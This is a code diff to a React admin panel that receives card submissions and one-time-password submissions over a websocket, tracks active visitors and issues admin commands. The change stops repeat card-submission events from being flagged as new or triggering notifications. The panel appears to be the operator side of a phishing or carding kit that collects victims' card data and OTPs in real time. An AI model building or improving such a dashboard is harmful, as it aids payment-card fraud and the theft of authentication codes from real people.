@@ -1,5 +1,3 @@
-
-
 import React, { useState, useEffect, useMemo } from 'react';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
 import { wsClient } from '@/integrations/ws-client';
@@ -55,6 +53,16 @@ const AdminPanel = () => {
       isNew: false // Initialize as false, will be set to true only for new submissions
     }));
   });
+  const [existingSubmissionIds, setExistingSubmissionIds] = useState<Set<string>>(() => {
+    const savedSubmissions = localStorage.getItem('card_submissions');
+    let parsedSubmissions: CardSubmission[] = [];
+    try {
+      parsedSubmissions = savedSubmissions ? JSON.parse(savedSubmissions) : [];
+    } catch (e) {
+      console.error("Failed to parse card submissions from localStorage", e);
+    }
+    return new Set(parsedSubmissions.map(s => s.id));
+  });
   const [visitors, setVisitors] = useState<Visitor[]>([]);
   const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
   const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
@@ -109,11 +117,32 @@ const AdminPanel = () => {
 
     const handleCardSubmission = (submission: CardSubmission) => {
       console.log('[AdminPanel] Received card_submission:', submission);
+      
+      // Check if this submission already exists in localStorage
+      const isExistingSubmission = existingSubmissionIds.has(submission.id);
+      
       setCardSubmissions(prev => {
-        const updatedSubmissions = [{ ...submission, isNew: true, created_at: new Date().toISOString() }, ...prev];
-        return updatedSubmissions;
+        const existingIndex = prev.findIndex(s => s.id === submission.id);
+        if (existingIndex >= 0) {
+          // Update existing submission without marking as new
+          const updated = [...prev];
+          updated[existingIndex] = { ...submission, isNew: false };
+          return updated;
+        } else {
+          // Only mark as new if it's truly a new submission (not from localStorage)
+          const updatedSubmissions = [{ 
+            ...submission, 
+            isNew: !isExistingSubmission, 
+            created_at: new Date().toISOString() 
+          }, ...prev];
+          return updatedSubmissions;
+        }
       });
-      showNotification('New card submission received');
+      
+      // Only show notification for truly new submissions
+      if (!isExistingSubmission) {
+        showNotification('New card submission received');
+      }
     };
 
     const handleOtpSubmitted = (data: { submission_id: string; otp: string }) => {
@@ -191,6 +220,7 @@ const AdminPanel = () => {
       console.log('[AdminPanel] Deleting all transactions');
       setCardSubmissions([]);
       setAdminCommands({});
+      setExistingSubmissionIds(new Set());
       localStorage.removeItem('card_submissions');
       showNotification('All transactions deleted');
     };
@@ -257,7 +287,7 @@ const AdminPanel = () => {
         wsClient.disconnect();
       }
     };
-    }, []);
+    }, [existingSubmissionIds]);
 
   // Periodic cleanup of stale visitors (older than 2 minutes)
   useEffect(() => {
@@ -307,6 +337,7 @@ const AdminPanel = () => {
     if (window.confirm('Are you sure you want to delete all transactions? This action cannot be undone.')) {
       wsClient.send('delete_all_transactions', {});
       setCardSubmissions([]);
+      setExistingSubmissionIds(new Set());
       showNotification('All transactions deleted successfully');
     }
   };
@@ -573,4 +604,3 @@ const AdminPanel = () => {
 };
 
 export default AdminPanel;
-
